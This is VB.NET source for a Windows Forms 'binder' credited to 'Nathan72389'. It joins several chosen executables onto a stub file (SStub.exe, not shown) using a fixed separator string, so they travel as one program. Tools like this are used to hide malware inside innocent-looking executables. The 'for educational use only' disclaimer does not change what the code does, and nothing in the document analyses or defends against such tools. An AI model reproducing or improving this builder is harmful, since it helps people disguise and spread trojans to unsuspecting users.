Imports System.Runtime.InteropServices
Imports System.IO
Imports fLaSh.Dissembler
Public Class Form1
    Const Filesplit = "()72389481217()"

#Region "Icon stuff"
    Private Structure SHFILEINFO
        Public hIcon As IntPtr            ' : icon
        Public iIcon As Integer           ' : icondex
        Public dwAttributes As Integer    ' : SFGAO_ flags
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=260)> _
        Public szDisplayName As String
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=80)> _
        Public szTypeName As String
    End Structure

    Private Declare Auto Function SHGetFileInfo Lib "shell32.dll" _
            (ByVal pszPath As String, _
             ByVal dwFileAttributes As Integer, _
             ByRef psfi As SHFILEINFO, _
             ByVal cbFileInfo As Integer, _
             ByVal uFlags As Integer) As IntPtr

    Private Const SHGFI_ICON = &H100
    Private Const SHGFI_SMALLICON = &H1
    Private Const SHGFI_LARGEICON = &H0    ' Large icon
    Private nIndex = 0

#End Region
#Region "Open files"
    Sub open_files()
        Dim hImgSmall As IntPtr  'The handle to the system image list.
        Dim hImgLarge As IntPtr  'The handle to the system image list.
        Dim shinfo As SHFILEINFO
        shinfo = New SHFILEINFO()
        Dim openFileDialog1 As New OpenFileDialog
        openFileDialog1.Multiselect = True
        openFileDialog1.Filter = "*.Exe|*.Exe"
        openFileDialog1.FilterIndex = 2
        openFileDialog1.RestoreDirectory = True
        ListView1.SmallImageList = ImageList1
        ListView1.LargeImageList = ImageList1
        shinfo.szDisplayName = New String(Chr(0), 260)
        shinfo.szTypeName = New String(Chr(0), 80)
        If (openFileDialog1.ShowDialog() = DialogResult.OK) Then
            For Each fName In openFileDialog1.FileNames

                'Use this to get the small icon.
                'hImgSmall = SHGetFileInfo(fName, 0, shinfo, _
                '            Marshal.SizeOf(shinfo), _
                '            SHGFI_ICON Or SHGFI_SMALLICON)
                'Use this to get the large icon.
                hImgLarge = SHGetFileInfo(fName, 0, shinfo, _
                Marshal.SizeOf(shinfo), _
                SHGFI_ICON Or SHGFI_LARGEICON)

                'The icon is returned in the hIcon member of the
                'shinfo struct.
                Dim myIcon As System.Drawing.Icon
                myIcon = System.Drawing.Icon.FromHandle(shinfo.hIcon)
                ImageList1.Images.Add(myIcon)       'Add icon to imageList.
                ListView1.Items.Add(fName, nIndex)  'Add file name and icon to listview.
                nIndex = nIndex + 1
            Next
        End If
        text_change()
    End Sub

#End Region
#Region "Misc"
    Sub text_change()
        Dim itm As String = ListView1.Items.Count
        If itm = 1 Then
            Me.Text = "1 File Loaded"
        Else : Me.Text = "1 Simple Ass Binder By: Nathan72389"
        End If
        If itm > 1 Then Me.Text = itm & " Files Loaded"
    End Sub
#End Region
#Region "menu"
    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        End
    End Sub

    Private Sub RemoveAllToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles removeallfilebtn.Click
        ListView1.Items.Clear()
        text_change()
    End Sub

    Private Sub RemoveFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles removefilebtn.Click
        For Each lvItem As ListViewItem In ListView1.SelectedItems
            lvItem.Remove()
        Next
        text_change()
    End Sub


    Private Sub bindfiles_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BindFiles.Click
        Dim savename, stub, inputfile As String
        If (sfd1.ShowDialog() = DialogResult.OK) Then
            savename = sfd1.FileName
        Else : Exit Sub
        End If
        FileOpen(3, Application.StartupPath & "\SStub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(3))
        FileGet(3, stub)
        FileClose(3)
        FileOpen(3, savename, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(3, stub)
        'FileOpen(3, savename, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        For I = 0 To ListView1.Items.Count - 1
            FileOpen(1, ListView1.Items(I).Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            inputfile = Space(LOF(1))
            FileGet(1, inputfile)
            FileClose(1)
            FilePut(3, Filesplit & inputfile)
        Next
        FileClose(3)
        MsgBox("Binded")
        Me.Close()
    End Sub

    Private Sub LoadFilesToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LoadFilesToolStripMenuItem.Click
        open_files()
    End Sub

    Private Sub ContextMenuStrip1_Opening(ByVal sender As System.Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStrip1.Opening
        If ListView1.Items.Count >= 2 Then
            BindFiles.Enabled = True
            removeallfilebtn.Enabled = True
        Else : BindFiles.Enabled = False
            removeallfilebtn.Enabled = False
        End If
        If ListView1.Items.Count >= 1 Then
            removefilebtn.Enabled = True
        Else : removefilebtn.Enabled = False
        End If
    End Sub


    Private Sub AboutToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AboutToolStripMenuItem.Click
        MsgBox("1 Simple Ass Binder was made by Nathan72389" & vbNewLine & "for educational use only!", MsgBoxStyle.OkOnly, "About")
    End Sub
#End Region

End Class
